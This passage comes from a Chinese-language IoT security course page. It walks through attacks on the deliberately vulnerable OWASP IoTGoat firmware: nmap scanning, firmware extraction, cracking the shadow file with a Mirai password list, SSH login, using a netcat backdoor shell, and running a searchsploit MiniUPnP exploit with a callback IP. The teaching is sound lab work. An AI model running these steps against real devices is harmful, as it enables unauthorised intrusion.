+          <td style="text-align: left">掃描目標 UDP 協定的埠。UDP 協定的埠相對 TCP 協定的埠而言不太常見，但在某些情況下可能會發現一些可疑的進入點。</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>-Pn</code></td>
+          <td style="text-align: left">不使用 <code>ping</code> 檢查主機是否存活。可以解決例如 Windows 防火牆全開的情況下，主機可能不回應 <code>ping</code> 的問題。</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>-o {file}</code></td>
+          <td style="text-align: left">將掃描結果輸出為檔案。</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>-p {port}</code></td>
+          <td style="text-align: left">指定要掃描的埠。如果只對某個特定埠感興趣，可以使用此選項節省掃描時間。</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>--script {script}</code></td>
+          <td style="text-align: left">指定用來掃描的腳本。在 Nmap 中有許多腳本可用於掃描。</td>
+      </tr>
+  </tbody>
+</table>
+<p>開啟本課程的 AttackBox 與 LabBox，使用 AttackBox 的 nmap 工具掃描 IoTGoat 的 IP 開啟的埠。使用指令 <code>nmap -p- -T4 IP_ADDRESS</code> 可以發現目標 IP 開啟的埠有 22、53、80、443、5000 等。每一個埠各代表一種服務。例如：80 埠的 HTTP 代表有可能是網頁服務。</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/nmap_hu493437168503179795.png 330w,
+        /materials/iot_security/exercise/nmap_hu1496015700509272587.png 660w,
+        /materials/iot_security/exercise/nmap_hu16738888208131360002.png 1024w,
+        /materials/iot_security/exercise/nmap_hu15339504406271986509.png 2x"
+        src="/materials/iot_security/exercise/nmap_hu1496015700509272587.png"
+        alt="nmap"
+      />
+      
+    </figure>
+</p>
+
+
+<h3 class="relative group">🐧韌體分析 
+    <div id="%E9%9F%8C%E9%AB%94%E5%88%86%E6%9E%90" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E9%9F%8C%E9%AB%94%E5%88%86%E6%9E%90" aria-label="定位點">#</a>
+    </span>        
+    
+</h3>
+<p>除了使用 nmap 掃描目標來了解設備的服務與版本外，也可以透過分析韌體的方式取得更多可供利用的資訊。在分析設備以前，可以將取得韌體作為第一步，許多 IoT 設備廠商會將產品的更新韌體放置於官網上供使用者進行下載更新，攻擊者可以透過分析這些韌體或更新檔來找出可被攻擊的弱點。</p>
+<p>IoTGoat 於 github 上提供多個韌體映像檔供使用者練習分析，進入 IoTGoat 的 <a href="https://github.com/OWASP/IoTGoat/releases" target="_blank">Github</a> 頁面後，截至 2023/5 ，最新的韌體映像檔版本為 v1.0，並有三種版本，皆可下載進行分析與利用。</p>
+<ul>
+<li>IoTGoat-raspberry-pi2-sysupgrade.img</li>
+<li>IoTGoat-raspberry-pi2.img</li>
+<li>IoTGoat-x86.img.gz</li>
+</ul>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/iotgoat_hu4849674765717087622.png 330w,
+        /materials/iot_security/exercise/iotgoat_hu6148303120550463245.png 660w,
+        /materials/iot_security/exercise/iotgoat_hu4591548796645423200.png 1024w,
+        /materials/iot_security/exercise/iotgoat_hu8476319343752595495.png 2x"
+        src="/materials/iot_security/exercise/iotgoat_hu6148303120550463245.png"
+        alt="IoT Goat"
+      />
+      
+    </figure>
+</p>
+<p>我們將使用 <code>IoTGoat-x86.img.gz</code> 作為範例，首先透過 <code>wget</code> 下載檔案並且解壓縮。解壓縮的方法有許多種，可以透過 gzip 進行解壓縮。解壓縮後，我們可以在當前資料夾內發現一個 img 檔案，供我們進行後續分析。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget https://github.com/OWASP/IoTGoat/releases/download/v1.0/IoTGoat-x86.img.gz
+</span></span><span class="line"><span class="cl">gzip -d IoTGoat-x86.img.gz
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/gzip_hu14753086307896839354.png 330w,
+        /materials/iot_security/exercise/gzip_hu16753067156792214997.png 660w,
+        /materials/iot_security/exercise/gzip_hu14313852406005941704.png 1024w,
+        /materials/iot_security/exercise/gzip_hu16131002121762425446.png 2x"
+        src="/materials/iot_security/exercise/gzip_hu16753067156792214997.png"
+        alt="gzip"
+      />
+      
+    </figure>
+</p>
+<p>在分析韌體檔時，通常會使用 Binwalk 這個工具，Binwalk 是一個用於分析和提取韌體映像檔的工具，通常用於檢測韌體中的隱藏資訊，例如：壓縮檔、圖片、設定檔等。Binwalk 透過搜尋韌體映像檔的特定簽名和魔術數字 (magic numbers) 來協助提取，將隱藏在目標內的資料提取成新的檔案。我們將使用這個工具提取出 IoT 設備韌體的檔案系統。首先我們使用 <code>binwalk -e TARGET</code> 來提取映像檔內的資訊。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">binwalk -e IoTGoat-x86.img
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/binwalk_hu2434838592743008024.png 330w,
+        /materials/iot_security/exercise/binwalk_hu10177639079751316854.png 660w,
+        /materials/iot_security/exercise/binwalk_hu4296337888748489650.png 1024w,
+        /materials/iot_security/exercise/binwalk_hu6040724754830316020.png 2x"
+        src="/materials/iot_security/exercise/binwalk_hu10177639079751316854.png"
+        alt="binwalk"
+      />
+      
+    </figure>
+</p>
+<p>執行 <code>ls -la</code> 後可以發現一個新的目錄 <code>_IoTGoat-x86.img.extracted</code>。</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/ls_hu14442657879349663664.png 330w,
+        /materials/iot_security/exercise/ls_hu14521947223838837168.png 660w,
+        /materials/iot_security/exercise/ls_hu6483114486094460624.png 1024w,
+        /materials/iot_security/exercise/ls_hu6675973233098395230.png 2x"
+        src="/materials/iot_security/exercise/ls_hu14521947223838837168.png"
+        alt="ls"
+      />
+      
+    </figure>
+</p>
+<p>接下來需要使用到一個可以用以分析韌體的工具 Firmwalker，Firmwalker 能夠分析檔案系統並找出敏感資訊，例如：密碼、資料庫等資訊。而在 IoT 設備中，常見的漏洞之一便是開發者直接將出廠的密碼 Hardcode 於韌體內，因此當攻擊者取得韌體並分析出密碼時，便可直接利用 Hardcode 的密碼連上機器。</p>
+<p>首先執行 <code>git clone</code> 來下載 Firmwalker，並進入 <code>firmwalker</code> 目錄執行 <code>firmwalker.sh</code> ，指定目標路徑為剛剛提取出的目錄 <code>_IoTGoat-x86.img.extracted</code>。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/craigz28/firmwalker.git
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> firmwalker
+</span></span><span class="line"><span class="cl">./firmwalker.sh ../_IoTGoat-x86.img.extracted
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/firmwalker_hu11222535412865027484.png 330w,
+        /materials/iot_security/exercise/firmwalker_hu6652464955585087229.png 660w,
+        /materials/iot_security/exercise/firmwalker_hu7476195479948369812.png 1024w,
+        /materials/iot_security/exercise/firmwalker_hu18315022581631247052.png 2x"
+        src="/materials/iot_security/exercise/firmwalker_hu6652464955585087229.png"
+        alt="firmwalker"
+      />
+      
+    </figure>
+</p>
+<p>執行後，我們便能透過這些資訊決定接下來的行動。我們將在之後的章節討論分析的結果以及攻擊的方式。</p>
+
+
+<h2 class="relative group">🦉I1 脆弱和寫死的密碼 
+    <div id="i1-%E8%84%86%E5%BC%B1%E5%92%8C%E5%AF%AB%E6%AD%BB%E7%9A%84%E5%AF%86%E7%A2%BC" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#i1-%E8%84%86%E5%BC%B1%E5%92%8C%E5%AF%AB%E6%AD%BB%E7%9A%84%E5%AF%86%E7%A2%BC" aria-label="定位點">#</a>
+    </span>        
+    
+</h2>
+<p>我們將延續剛剛的韌體分析來嘗試利用此弱點。</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I1-1_hu5753269663350091796.png 330w,
+        /materials/iot_security/exercise/I1-1_hu1391125658676235680.png 660w,
+        /materials/iot_security/exercise/I1-1_hu18156488340934911306.png 1024w,
+        /materials/iot_security/exercise/I1-1_hu2963526985726738599.png 2x"
+        src="/materials/iot_security/exercise/I1-1_hu1391125658676235680.png"
+        alt="I1-1"
+      />
+      
+    </figure>
+</p>
+<p>在 Unix-like 的作業系統中，<code>/etc/shadow</code> 是一個非常重要的系統文件。該文件儲存了系統上所有帳號的密碼相關資訊，包括經過 Hash 後的密碼。並且為了保證這些資料的安全，這個文件只能由 root 做讀取和寫入，而另一個能由一般使用者讀取的文件是 <code>/etc/passwd</code>。</p>
+<p><code>/etc/shadow</code> 文件的每一行都代表一個使用者，以冒號 <code>:</code> 分隔成多個字段，在本節我們只需要了解前兩個字段所代表的意思。在一個正常的 <code>/etc/shadow</code> 檔案中通常每行的前兩個字段會按照以下的格式儲存。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">USERNAME：HASHED_PASSWORD
+</span></span></code></pre></div><p>hashed_password 的字串是使用者經過 Hash 過後的密碼。如果這個字串是空的，則使用者不存在密碼。如果此字串包含一個 <code>!</code> 或 <code>*</code>，則使用者不能登錄。若取得 <code>/etc/shadow</code>，代表能利用暴力破解來嘗試破解使用者經過 Hash 過的密碼，並且嘗試使用破解過後的密碼來連接至目標機器。若使用者沒有更改，攻擊者便能使用此手法連接至目標。在上一章 <code>Firmwalker</code> 掃描的結果便能看到目錄內存在 <code>/etc/shadow</code>，可以針對這個檔案做進一步的分析。</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I1-2_hu4920814875739464980.png 330w,
+        /materials/iot_security/exercise/I1-2_hu17903593401614616092.png 660w,
+        /materials/iot_security/exercise/I1-2_hu17084479973161580341.png 1024w,
+        /materials/iot_security/exercise/I1-2_hu5056352969471651302.png 2x"
+        src="/materials/iot_security/exercise/I1-2_hu17903593401614616092.png"
+        alt="I1-2"
+      />
+      
+    </figure>
+</p>
+<p>在暴力破解階段，會需要使用到字典檔來對 Hash 進行暴力破解。會使用到 <code>mirai-botnet.txt</code> 這個字典檔。此字典檔位於 AttackBox 的 <code>/usr/share/seclists/Passwords/Malware/mirai-botnet.txt</code> 可以將這個檔案複製到當前目錄下以進行後續處理。由於該字典檔包含使用者名稱與密碼，但我們只需要使用密碼來進行爆破，因此可以使用 <code>awk</code> 指令來將密碼重新輸出到另一個檔案作為接下來使用的字典檔。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cp /usr/share/seclists/Passwords/Malware/mirai-botnet.txt .
+</span></span><span class="line"><span class="cl">awk <span class="s1">&#39;{print $2}&#39;</span> mirai-botnet.txt &gt; mirai-botnet-pass.txt
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I1-3_hu3276710811041225471.png 330w,
+        /materials/iot_security/exercise/I1-3_hu8257890347784375270.png 660w,
+        /materials/iot_security/exercise/I1-3_hu14162547619076146040.png 1024w,
+        /materials/iot_security/exercise/I1-3_hu870451062165467936.png 2x"
+        src="/materials/iot_security/exercise/I1-3_hu8257890347784375270.png"
+        alt="I1-3"
+      />
+      
+    </figure>
+</p>
+<p>接著我們將使用 <code>John the Ripper</code> 這個 Hash 破解工具，<code>John the Ripper</code> 常被用於破解 Unix、Windows、macOS 以及許多其他平台上的 Hash。<code>John the Ripper</code> 支援破解許多不同類型的 Hash 格式，例如：
+Unix Hash、Windows LM/NTLM Hash、MD5 等。我們已經取得了目標的 <code>/etc/shadow</code> 和用於暴力破解的字典檔，下一步我們將使用 <code>John the Ripper</code> 搭配字典檔對目標進行暴力破解。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john shadow --wordlist<span class="o">=</span>./mirai-botnet-pass.txt
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I1-4_hu1718236417448600949.png 330w,
+        /materials/iot_security/exercise/I1-4_hu3863028809429643938.png 660w,
+        /materials/iot_security/exercise/I1-4_hu10639158093739268883.png 1024w,
+        /materials/iot_security/exercise/I1-4_hu1709216368426098131.png 2x"
+        src="/materials/iot_security/exercise/I1-4_hu3863028809429643938.png"
+        alt="I1-4"
+      />
+      
+    </figure>
+</p>
+<p>執行破解後我們順利的取得了 iotgoatuser 的密碼，之後可以使用此 credential 來進入系統。</p>
+<p>回到上一張使用 nmap 掃描得出的結果，可以發現 <code>IoTGoat</code> 存在一個 SSH 服務，因此我們可以使用 SSH 以及剛剛發現的 Credential 來以 iotgoatuser 的身份進入系統。</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I1-5_hu1740864824164924937.png 330w,
+        /materials/iot_security/exercise/I1-5_hu4661900866656918389.png 660w,
+        /materials/iot_security/exercise/I1-5_hu5310754463490510100.png 1024w,
+        /materials/iot_security/exercise/I1-5_hu17490639022227878043.png 2x"
+        src="/materials/iot_security/exercise/I1-5_hu4661900866656918389.png"
+        alt="I1-5"
+      />
+      
+    </figure>
+</p>
+<p>在嘗試使用 SSH 對目標進行連接時會發現連接出現錯誤，可以在 SSH 的 args 加入 <code>-oHostKeyAlgorithms=+ssh-rsa</code> 來避免此錯誤的產生。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -oHostKeyAlgorithms<span class="o">=</span>+ssh-rsa iotgoatuser@IP
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I1-6_hu3789937270196351370.png 330w,
+        /materials/iot_security/exercise/I1-6_hu1197445481589869941.png 660w,
+        /materials/iot_security/exercise/I1-6_hu13578232221195688357.png 1024w,
+        /materials/iot_security/exercise/I1-6_hu17050740347167162398.png 2x"
+        src="/materials/iot_security/exercise/I1-6_hu1197445481589869941.png"
+        alt="I1-6"
+      />
+      
+    </figure>
+</p>
+<p>最後便成功利用 IoTGoat 韌體內包含的預設密碼與密碼 Hash 進入了該 IoT 裝置。</p>
+
+
+<h2 class="relative group">🦉I2 不安全的網路服務 
+    <div id="i2-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%B6%B2%E8%B7%AF%E6%9C%8D%E5%8B%99" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#i2-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%B6%B2%E8%B7%AF%E6%9C%8D%E5%8B%99" aria-label="定位點">#</a>
+    </span>        
+    
+</h2>
+<p>不安全的網路服務 (Insecure Network Services) 表示 IoT 設備可能因網路服務的安全缺陷而導致嚴重風險。導致此問題的原因是使用了危險的協定，例如：HTTP、Telnet 等。</p>
+<p>發生該弱點的 IoT 設備通常具有以下幾點特徵：</p>
+<ul>
+<li>使用了不安全或是過時的網路協定</li>
+<li>在網路上傳輸敏感資訊時未加密</li>
+<li>開放了不必要的埠</li>
+</ul>
+<p>在 IoTGoat 中，本弱點對應到 65534 埠，由於 Telnet 並不會將傳輸資料加密因此其連接是不安全的。根據最小權限原則，在 IoT 設備有 SSH 的情況下此埠也沒有開啟的必要，因此 Telnet 服務具有不安全的網路服務這一弱點。</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I2-1_hu8744442319105559985.png 330w,
+        /materials/iot_security/exercise/I2-1_hu4598209058602361610.png 660w,
+        /materials/iot_security/exercise/I2-1_hu4751060208553507104.png 1024w,
+        /materials/iot_security/exercise/I2-1_hu11764263757491066189.png 2x"
+        src="/materials/iot_security/exercise/I2-1_hu4598209058602361610.png"
+        alt="I2-1.png"
+      />
+      
+    </figure>
+</p>
+
+
+<h2 class="relative group">🦉I3 不安全的生態介面 
+    <div id="i3-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%94%9F%E6%85%8B%E4%BB%8B%E9%9D%A2" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#i3-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%94%9F%E6%85%8B%E4%BB%8B%E9%9D%A2" aria-label="定位點">#</a>
+    </span>        
+    
+</h2>
+<p>不安全的生態介面 (Insecure Ecosystem Interfaces) 表示 IoT 設備的 Interface，例如：Web API、雲端 API 等可能存在的安全問題。這些 Interface 可能因各種原因被攻擊者利用。</p>
+<p>發生該弱點的 IoT 設備通常具有以下幾點特徵：</p>
+<ul>
+<li>API 未採用適當的身份驗證或授權機制</li>
+<li>Interface 存在安全漏洞</li>
+<li>Interface 回傳太多不必要的資訊</li>
+<li>未進行適當的輸入驗證，導致注入攻擊</li>
+</ul>
+<p>我們同樣可以透過 IoTGoat 的實作來觀察該弱點。在 nmap 掃描中，可以發現 5515 埠有未知的服務，在此我們可以嘗試使用 <code>nc</code> 去連接，可以發現連接後會顯示 Backdoor 的可疑字串。</p>
+<pre tabindex="0"><code>nc -nv IP_ADDRESS 5515
+</code></pre><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I3-1_hu15779401895804626665.png 330w,
+        /materials/iot_security/exercise/I3-1_hu14571389765228011426.png 660w,
+        /materials/iot_security/exercise/I3-1_hu12547874064509704787.png 1024w,
+        /materials/iot_security/exercise/I3-1_hu15974511041255118720.png 2x"
+        src="/materials/iot_security/exercise/I3-1_hu14571389765228011426.png"
+        alt="I3-1"
+      />
+      
+    </figure>
+</p>
+<p>嘗試輸入 <code>id</code>、<code>ls -la</code>、<code>ifconfig</code> 等 Linux 指令後，可以發現指令都可以順利執行，由此我們可以判斷，這極有可能是開發者為了方便 Debug 而留下的工具，但是在 IoT 設備上市後沒有移除。因此，可以確定此 IoT 設備包含一個後門並且位於 5515 埠。</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I3-2_hu5211063981447037595.png 330w,
+        /materials/iot_security/exercise/I3-2_hu10312878745917949466.png 660w,
+        /materials/iot_security/exercise/I3-2_hu15470249777349300841.png 1024w,
+        /materials/iot_security/exercise/I3-2_hu17823498302421664778.png 2x"
+        src="/materials/iot_security/exercise/I3-2_hu10312878745917949466.png"
+        alt="I3-2"
+      />
+      
+    </figure>
+</p>
+
+
+<h2 class="relative group">🦉I4 缺乏安全的更新機制 
+    <div id="i4-%E7%BC%BA%E4%B9%8F%E5%AE%89%E5%85%A8%E7%9A%84%E6%9B%B4%E6%96%B0%E6%A9%9F%E5%88%B6" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#i4-%E7%BC%BA%E4%B9%8F%E5%AE%89%E5%85%A8%E7%9A%84%E6%9B%B4%E6%96%B0%E6%A9%9F%E5%88%B6" aria-label="定位點">#</a>
+    </span>        
+    
+</h2>
+<p>缺乏安全的更新機制 (Lack of Secure Update Mechanism) 表示 IoT 設備缺乏安全的更新機制，使得設備無法獲得最新的安全修補程式和功能更新。</p>
+<p>發生該弱點的 IoT 設備通常具有以下幾點特徵：</p>
+<ul>
+<li>IoT 設備製造商未提供更新</li>
+<li>IoT 設備的更新檔案未加密</li>
+<li>更新時缺乏對更新檔案的完整性檢查</li>
+<li>更新不需要使用者許可</li>
+</ul>
+<p>我們同樣可以透過 IoTGoat 的實作來觀察該弱點。在 nmap 掃描中，5000 埠上的 HTTP Response 中存在著看起來像是服務版本的字串 <code>OpenWRT / 18.06.2</code>。</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I4-1_hu837101431637692288.png 330w,
+        /materials/iot_security/exercise/I4-1_hu10880769433529352332.png 660w,
+        /materials/iot_security/exercise/I4-1_hu17956435542697651458.png 1024w,
+        /materials/iot_security/exercise/I4-1_hu7476558227594088868.png 2x"
+        src="/materials/iot_security/exercise/I4-1_hu10880769433529352332.png"
+        alt="I4-1"
+      />
+      
+    </figure>
+</p>
+<p>我們可以搜尋<code>OpenWRT / 18.06.2</code>，會發現此版本的 OpenWRT 有一個 CVE-2020-7982 的漏洞。</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I4-2_hu4218230172354313320.png 330w,
+        /materials/iot_security/exercise/I4-2_hu17692382629608669627.png 660w,
+        /materials/iot_security/exercise/I4-2_hu10754648527201057686.png 1024w,
+        /materials/iot_security/exercise/I4-2_hu9365349274528212607.png 2x"
+        src="/materials/iot_security/exercise/I4-2_hu17692382629608669627.png"
+        alt="I4-2"
+      />
+      
+    </figure>
+</p>
+<p>搜尋此漏洞編號後可以發現利用此漏洞造成的影響非常嚴重，因此我們將設定一個定時更新的腳本讓系統能夠更新系統以及安裝的所有軟體。</p>
+<p>利用上一章所找到的後門，輸入 <code>ls -la /bin</code>可以發現名為 opkg 的檔案。opkg 是一個輕量級的套件管理器，通常會在 IoT 的 Linux 系統中使用，可以使用 <code>opkg update</code> 以及 <code>opkg upgrade {pkgs}</code> 來進行套件更新。我們使用 <code>opkg list-upgradable | cut -f 1 -d ' ' | xargs -r opkg upgrade</code> 指令將所有套件一次更新到最新版本。需要注意，一次更新所有套件是非常危險的，有可能因為相容性問題導致 IoT 設備無法正常運作，本次操作主要是為了展示防禦該弱點的方式。</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I4-3_hu12936420587315172956.png 330w,
+        /materials/iot_security/exercise/I4-3_hu14276942784591785064.png 660w,
+        /materials/iot_security/exercise/I4-3_hu2280852053124661236.png 1024w,
+        /materials/iot_security/exercise/I4-3_hu13792391472079098215.png 2x"
+        src="/materials/iot_security/exercise/I4-3_hu14276942784591785064.png"
+        alt="I4-3"
+      />
+      
+    </figure>
+</p>
+<p>為了自動更新，可以將更新腳本寫入 <code>/etc/crontabs</code> 中並設定自動於每天凌晨一點執行，便能緩解此弱點造成的危害。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;opkg update ; opkg list-upgradable | cut -f 1 -d &#39;</span> <span class="s1">&#39; | xargs -r opkg upgrade&#39;</span> &gt; /etc/crontabs/update.sh
+</span></span><span class="line"><span class="cl">chmod +x /etc/crontabs/update.sh
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;0 1 * * * /bin/sh /etc/crontabs/update.sh&#39;</span> &gt; /etc/crontabs/root
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I4-4_hu8087859860443529649.png 330w,
+        /materials/iot_security/exercise/I4-4_hu16514679090335274252.png 660w,
+        /materials/iot_security/exercise/I4-4_hu2850028738113260996.png 1024w,
+        /materials/iot_security/exercise/I4-4_hu11365008536486790077.png 2x"
+        src="/materials/iot_security/exercise/I4-4_hu16514679090335274252.png"
+        alt="I4-4"
+      />
+      
+    </figure>
+</p>
+
+
+<h2 class="relative group">🦉I5 使用不安全或是過時的元件 
+    <div id="i5-%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E6%88%96%E6%98%AF%E9%81%8E%E6%99%82%E7%9A%84%E5%85%83%E4%BB%B6" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#i5-%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E6%88%96%E6%98%AF%E9%81%8E%E6%99%82%E7%9A%84%E5%85%83%E4%BB%B6" aria-label="定位點">#</a>
+    </span>        
+    
+</h2>
+<p>使用不安全或是過時的元件 (Use of Insecure or Outdated Components) 表示 IoT 設備可能使用不安全或過時的軟體及元件，這些軟體或元件可能存在已知的安全漏洞，但由於已經停止維護，所以無法獲得修補程式。</p>
+<p>發生該弱點的 IoT 設備通常具有以下幾點特徵：</p>
+<ul>
+<li>使用已知存在漏洞的軟體或元件</li>
+<li>使用已停止維護的軟體或元件</li>
+</ul>
+<p>我們同樣可以透過 IoTGoat 的實作來觀察該弱點。在 nmap 掃描中查看所有 埠上服務的版本。</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I5-1_hu10806012794030133053.png 330w,
+        /materials/iot_security/exercise/I5-1_hu15314975704566629267.png 660w,
+        /materials/iot_security/exercise/I5-1_hu18218096877284642147.png 1024w,
+        /materials/iot_security/exercise/I5-1_hu8588826231475623211.png 2x"
+        src="/materials/iot_security/exercise/I5-1_hu15314975704566629267.png"
+        alt="I5-1"
+      />
+      
+    </figure>
+</p>
+<p>在 AttackBox 中，可以使用 <code>searchsploit</code> 這個工具幫助使用者快速搜尋是否有公開的漏洞能利用。可以透過輸入 <code>searchsploit SERVICE</code> 來快速搜尋服務是否有漏洞。我們搜尋 <code>dnsmasq 2.73</code> 以及 <code>MiniUPnP 2.1</code> 可以發現都存在公開的漏洞，在此我們將目標鎖定為 <code>MiniUPnP 2.1</code> 嘗試對其進行攻擊。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">searchsploit dnsmasq 2.73
+</span></span><span class="line"><span class="cl">searchsploit MiniUPnP 2.1
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I5-2_hu7917187627130022723.png 330w,
+        /materials/iot_security/exercise/I5-2_hu5851593280591546051.png 660w,
+        /materials/iot_security/exercise/I5-2_hu17198140034077265328.png 1024w,
+        /materials/iot_security/exercise/I5-2_hu16586860290583289971.png 2x"
+        src="/materials/iot_security/exercise/I5-2_hu5851593280591546051.png"
+        alt="I5-2"
+      />
+      
+    </figure>
+</p>
+<p>找到攻擊腳本後，透過 <code>searchsploit -m {EDB-ID}</code> 指令將攻擊用的腳本複製到當前路徑下。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">searchsploit -m <span class="m">46278</span>
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I5-3_hu2061037400583121488.png 330w,
+        /materials/iot_security/exercise/I5-3_hu476480437741413334.png 660w,
+        /materials/iot_security/exercise/I5-3_hu16208512746006654253.png 1024w,
+        /materials/iot_security/exercise/I5-3_hu5723531713728494782.png 2x"
+        src="/materials/iot_security/exercise/I5-3_hu476480437741413334.png"
+        alt="I5-3"
+      />
+      
+    </figure>
+</p>
+<p>嘗試閱讀攻擊腳本的程式碼後便可對目標進行攻擊，使用以下指令，可以觀察到我們成功越界讀取到不該被讀取的資料。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python 46278.py --callback_ip ATTACKBOX_IP --callback_port <span class="m">8787</span> LABBOX_IP <span class="m">5000</span>
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I5-4_hu5429332488909930758.png 330w,
+        /materials/iot_security/exercise/I5-4_hu16296331858230885566.png 660w,
+        /materials/iot_security/exercise/I5-4_hu11288712098604946223.png 1024w,
+        /materials/iot_security/exercise/I5-4_hu10940947797573857782.png 2x"
+        src="/materials/iot_security/exercise/I5-4_hu16296331858230885566.png"
+        alt="I5-4"
+      />
+      
+    </figure>
+</p>
